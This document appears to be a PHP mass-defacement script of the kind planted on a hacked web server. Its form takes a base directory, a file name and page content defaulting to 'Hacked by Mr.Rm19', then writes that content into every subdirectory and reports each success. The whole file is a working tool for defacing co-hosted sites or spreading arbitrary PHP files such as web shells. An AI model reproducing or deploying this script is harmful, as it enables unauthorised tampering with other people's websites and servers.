<html><center><h1 style="color:red;">LO0LZ</h1></center></html>
<?php
echo "<title>$_$_$_$_$_$_!41231221</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='s.php'><br><br>";
echo "otherDir: <input type='text' name='otherdir' value=''><br><br>";

echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>Hacked by Mr.Rm19</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['otherdir']."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                }
        endforeach;
}
 
?>
